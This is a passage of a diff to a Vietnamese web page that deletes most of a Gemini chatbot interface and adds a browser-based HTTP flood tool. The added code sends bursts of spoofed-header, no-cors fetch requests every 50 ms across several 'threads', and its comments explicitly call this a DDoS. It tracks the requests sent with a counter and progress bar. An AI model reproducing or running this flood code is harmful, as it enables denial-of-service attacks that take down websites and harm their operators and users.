-                copyButton.classList.add('copy-code-button');
-                copyButton.innerHTML = '<i class="fas fa-clipboard"></i>';
-                copyButton.title = 'Sao chép mã';
-                const copiedSpan = document.createElement('span');
-                copiedSpan.classList.add('copied-message');
-                copiedSpan.textContent = 'Đã sao chép!';
-                pre.appendChild(copiedSpan);
-
-                copyButton.addEventListener('click', () => {
-                    navigator.clipboard.writeText(codeContent).then(() => {
-                        copiedSpan.classList.add('show');
-                        setTimeout(() => {
-                            copiedSpan.classList.remove('show');
-                        }, 2000);
-                    }).catch(err => {
-                        console.error('Không thể sao chép mã: ', err);
-                        displayErrorMessage('Lỗi khi sao chép mã.');
-                    });
-                });
-                pre.appendChild(copyButton);
-                messageBubble.appendChild(pre);
-
-            } else {
-                messageBubble.textContent = message;
-            }
-
-            messageArea.appendChild(messageBubble);
-            messageArea.scrollTop = messageArea.scrollHeight;
-        }
-
-
-        async function getGeminiResponse(userMessage) {
-            // **Security Warning:** Embedding API keys directly in client-side JavaScript is NOT recommended for production applications.
-            // This is done here for simplicity in this example, but it exposes your API key.
-            // For real applications, use a backend server to proxy API requests.
-
-            const apiUrl = geminiAPIUrl.replace('apiKey', apiKey); // <------- API KEY REPLACED HERE
-
-            try {
-                const response = await fetch(apiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        contents: [{
-                            parts: [{ text: userMessage }]
-                        }]
+                    fetch(requestUrl, {
+                        mode: 'no-cors',
+                        keepalive: true, // Thử nghiệm keepalive
+                        headers: {
+                            'User-Agent': randomUserAgent,
+                            'Referer': randomReferer
+                        }
                     })
-                });
+                    .then(response => {
+                        sentRequestsCounter++;
+                        requestsSentDiv.textContent = `Requests đã gửi: ${sentRequestsCounter}`;
+                        // console.log(`Client-Side HTTP Flood: Request sent, status: ${response.status}`); // Tắt log để giảm tải trình duyệt
+                    })
+                    .catch(error => {
+                        console.error('Client-Side HTTP Flood Error:', error);
+                    });
+                };
 
-                if (!response.ok) {
-                    const errorData = await response.json();
-                    console.error('API Error:', errorData);
-                    throw new Error(`Gemini API Lỗi: ${response.status} - ${errorData.error.message || response.statusText}`);
-                }
+                const totalRequests = threads * (duration * 1000 / 50); // Ước tính tổng số request (có thể không chính xác)
+                let requestsSentInInterval = 0; // Đếm request trong mỗi interval để cập nhật progress bar
 
-                const responseData = await response.json();
-                const aiResponseText = responseData.candidates[0].content.parts[0].text || 'Không có phản hồi từ AI Gemini';
+                attackInterval = setInterval(() => {
+                    const promises = []; // Mảng chứa các Promise cho fetch
+                    for (let i = 0; i < threads; i++) {
+                        promises.push(sendHttpRequest()); // Thêm Promise vào mảng
+                    }
+                    Promise.all(promises).then(() => { // Chờ tất cả các request trong interval hoàn thành (không thực sự cần thiết cho DDoS, nhưng có thể hữu ích cho việc đếm)
+                        requestsSentInInterval += threads; // Cập nhật số request đã gửi trong interval
+                        const progress = (Date.now() - startTime) / (duration * 1000) * 100; // Tính phần trăm tiến trình
+                        progressBar.style.width = `${progress}%`; // Cập nhật thanh tiến trình
+                        if (progress > 100) progressBar.style.width = '100%'; // Đảm bảo không vượt quá 100%
+                    });
 
-                return aiResponseText.trim();
+                }, 50); // Interval gửi request (giảm xuống để tăng tốc độ, thử nghiệm cẩn thận)
 
-            } catch (error) {
-                console.error('Fetch Error:', error);
-                throw new Error('Không thể kết nối đến Gemini API. Vui lòng kiểm tra API URL, API Key, kết nối mạng và thử lại.');
-            }
-        }
-
-
-        function addAIMessage(message) {
-            chatHistory.push({ sender: 'ai', text: message });
-            displayMessage('ai', message);
-            if (settings.autoSaveHistory) {
-                saveCurrentHistoryAuto();
-            }
-        }
-
-        function addAIMessageBubbleOnError(errorMessage) {
-            const messageBubble = document.createElement('div');
-            messageBubble.classList.add('message-bubble');
-            messageBubble.classList.add('ai');
-            messageBubble.classList.add('error');
-            messageBubble.textContent = errorMessage;
-            messageArea.appendChild(messageBubble);
-            messageArea.scrollTop = messageArea.scrollHeight;
-        }
-
-
-        // History Management
-        function openSaveHistoryModal() {
-            if (chatHistory.length === 0) {
-                alert('Không có lịch sử chat để lưu.');
-                return;
-            }
-            saveHistoryModal.style.display = "block";
-            if (settings.historyNameFirstQuestion && chatHistory.length > 0 && chatHistory[0].sender === 'user') {
-                historyNameInput.value = chatHistory[0].text.substring(0, 50);
-            } else {
-                historyNameInput.value = '';
-            }
-        }
-
-        function closeSaveHistoryModal() {
-            saveHistoryModal.style.display = "none";
-        }
-
-        function saveHistory() {
-            const historyName = historyNameInput.value.trim();
-            if (historyName) {
-                savedHistories[historyName] = chatHistory;
-                localStorage.setItem('chatHistories', JSON.stringify(savedHistories));
-                loadSavedHistoryList();
-                closeSaveHistoryModal();
-                displayConfirmationMessage(`Lịch sử chat "${historyName}" đã được lưu.`);
-                updateSaveHistoryButtonState();
-            } else {
-                alert('Vui lòng nhập tên lịch sử.');
-            }
-        }
-
-        function loadSavedHistoryList() {
-            historySubmenu.innerHTML = `<li class="history-search">
-                        <input type="text" id="historySearchInput" placeholder="Tìm kiếm lịch sử...">
-                    </li>`;
-            const historySearchInputElem = document.getElementById('historySearchInput');
-            historySearchInputElem.addEventListener('input', handleHistorySearch);
-
-            filteredHistories = searchHistories(historySearchInputElem.value);
-
-            for (const historyName in filteredHistories) {
-                const historyItem = document.createElement('li');
-                historyItem.classList.add('history-item');
-                historyItem.innerHTML = `
-                    <a href="#" onclick="loadHistory('${historyName}')">${historyName}</a>
-                    <button onclick="deleteHistory('${historyName}')"><i class="fas fa-trash"></i></button>
-                `;
-                historySubmenu.appendChild(historyItem);
-            }
-        }
-
-        function handleHistorySearch(event) {
-            const searchTerm = event.target.value.toLowerCase();
-            filteredHistories = searchHistories(searchTerm);
-            historySubmenu.innerHTML = `<li class="history-search">
-                        <input type="text" id="historySearchInput" placeholder="Tìm kiếm lịch sử...">
-                    </li>`;
-            const historySearchInputElem = document.getElementById('historySearchInput');
-            historySearchInputElem.addEventListener('input', handleHistorySearch);
-
-             for (const historyName in filteredHistories) {
-                const historyItem = document.createElement('li');
-                historyItem.classList.add('history-item');
-                historyItem.innerHTML = `
-                    <a href="#" onclick="loadHistory('${historyName}')">${historyName}</a>
-                    <button onclick="deleteHistory('${historyName}')"><i class="fas fa-trash"></i></button>
-                `;
-                historySubmenu.appendChild(historyItem);
-            }
-        }
-
-        function searchHistories(searchTerm) {
-            const results = {};
-            for (const historyName in savedHistories) {
-                if (historyName.toLowerCase().includes(searchTerm)) {
-                    results[historyName] = savedHistories[historyName];
-                }
-            }
-            return results;
-        }
-
-
-        function loadHistory(historyName) {
-            chatHistory = savedHistories[historyName];
-            messageArea.innerHTML = `<div class="loading-spinner" id="loading-spinner"></div>`;
-            loadingSpinner = document.getElementById('loading-spinner');
-            hideLoading();
-            messageArea.innerHTML = '';
-            chatHistory.forEach(message => {
-                displayMessage(message.sender, message.text);
             });
-            toggleSubmenu('history-submenu', { preventDefault: () => {} });
-            updateSaveHistoryButtonState();
-        }
-
-        function deleteHistory(historyName) {
-            if (confirm(`Bạn có chắc chắn muốn xóa lịch sử "${historyName}"?`)) {
-                delete savedHistories[historyName];
-                localStorage.setItem('chatHistories', JSON.stringify(savedHistories));
-                loadSavedHistoryList();
-                displayConfirmationMessage(`Lịch sử "${historyName}" đã bị xóa!`);
-                updateSaveHistoryButtonState();
-            }
-        }
-
-        function saveCurrentHistoryAuto() {
-            if (chatHistory.length > 0) {
-                let autoSaveName = 'Auto Save - ' + new Date().toLocaleString();
-                if (settings.historyNameFirstQuestion && chatHistory[0].sender === 'user') {
-                    autoSaveName = chatHistory[0].text.substring(0, 50) + ' (Auto Saved)';
-                }
-                savedHistories[autoSaveName] = chatHistory;
-                localStorage.setItem('chatHistories', JSON.stringify(savedHistories));
-                loadSavedHistoryList();
-            }
-        }
-
-
-        // Settings Management
-        document.getElementById('auto-save').checked = settings.autoSaveHistory;
-        document.getElementById('history-name-first-question').checked = settings.historyNameFirstQuestion;
-        document.getElementById('theme-select').value = settings.theme;
-        document.getElementById('bg-color').value = settings.bgColor;
-        document.getElementById('text-color').value = settings.textColor;
-        document.getElementById('chat-bg-color').value = settings.chatBgColor;
-
-        function saveSettings() {
-            settings.autoSaveHistory = document.getElementById('auto-save').checked;
-            settings.historyNameFirstQuestion = document.getElementById('history-name-first-question').checked;
-            settings.theme = document.getElementById('theme-select').value;
-            settings.bgColor = document.getElementById('bg-color').value;
-            settings.textColor = document.getElementById('text-color').value;
-            settings.chatBgColor = document.getElementById('chat-bg-color').value;
-            localStorage.setItem('chatSettings', JSON.stringify(settings));
-            applySettings();
-            toggleSubmenu('settings-submenu', { preventDefault: () => {} });
-            displayConfirmationMessage('Cài đặt đã được áp dụng và lưu!');
-        }
-
-        function undoSettings() {
-            settings = JSON.parse(localStorage.getItem('chatSettings')) || {
-                autoSaveHistory: false,
-                historyNameFirstQuestion: false,
-                theme: 'prism-tomorrow',
-                bgColor: '#121212',
-                textColor: '#ffffff',
-                chatBgColor: '#212121'
-            };
-            document.getElementById('auto-save').checked = settings.autoSaveHistory;
-            document.getElementById('history-name-first-question').checked = settings.historyNameFirstQuestion;
-            document.getElementById('theme-select').value = settings.theme;
-            document.getElementById('bg-color').value = settings.bgColor;
-            document.getElementById('text-color').value = settings.textColor;
-            document.getElementById('chat-bg-color').value = settings.chatBgColor;
-            applySettings();
-            toggleSubmenu('settings-submenu', { preventDefault: () => {} });
-            displayConfirmationMessage('Cài đặt đã được hoàn tác về trạng thái trước đó.');
-        }
-
-
-        function applySettings() {
-            document.body.style.backgroundColor = settings.bgColor;
-            document.body.style.color = settings.textColor;
-            messageArea.style.backgroundColor = settings.chatBgColor;
-
-            const prismThemeLink = document.querySelector('link[href*="prism"]');
-            let newThemeHref = `https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/${settings.theme}.min.css`;
-
-            if (settings.theme === 'prism') {
-                newThemeHref = `https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.css`;
-            } else if (!settings.theme.startsWith('prism-')) {
-                newThemeHref = `https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css`;
-                console.warn(`Invalid Prism.js theme name: ${settings.theme}. Falling back to tomorrow theme.`);
-            }
-
-            prismThemeLink.href = newThemeHref;
-
-             document.documentElement.style.setProperty('--bg-color', settings.bgColor);
-             document.documentElement.style.setProperty('--text-color', settings.textColor);
-             document.documentElement.style.setProperty('--chat-bg-color', settings.chatBgColor);
-             document.documentElement.style.setProperty('--sidebar-bg-color', settings.bgColor);
-             document.documentElement.style.setProperty('--chat-header-bg-color', settings.bgColor);
-             document.documentElement.style.setProperty('--input-area-bg-color', settings.bgColor);
-             document.documentElement.style.setProperty('--modal-content-bg-color', settings.bgColor);
-        }
-
-        function showLoading() {
-            loadingSpinner.classList.add('show');
-        }
-
-        function hideLoading() {
-            loadingSpinner.classList.remove('show');
-        }
-
-        function displayConfirmationMessage(message) {
-            const confirmationElem = document.getElementById('action-confirmation');
-            confirmationElem.textContent = message;
-            confirmationElem.classList.add('show');
-            setTimeout(() => {
-                confirmationElem.classList.remove('show');
-            }, 3000);
-        }
-
-        function displayErrorMessage(message) {
-            const errorElem = document.getElementById('api-error-message');
-            errorElem.textContent = message;
-            errorElem.classList.add('show');
-            setTimeout(() => {
-                errorElem.classList.remove('show');
-            }, 5000);
-        }
-
-        function updateSaveHistoryButtonState() {
-            saveHistoryMenuItem.classList.toggle('disabled', chatHistory.length === 0);
-            saveHistoryMenuItem.style.pointerEvents = chatHistory.length === 0 ? 'none' : 'auto';
-            saveHistoryMenuItem.style.opacity = chatHistory.length === 0 ? '0.5' : '1';
-        }
-
-        function checkInput() {
-            sendButton.disabled = !messageInput.value.trim();
-        }
-
-
-        // Close modal if clicked outside
-        window.onclick = function(event) {
-            if (event.target == saveHistoryModal) {
-                closeSaveHistoryModal();
-            }
-        }
+        });
     </script>
 </body>
 </html>
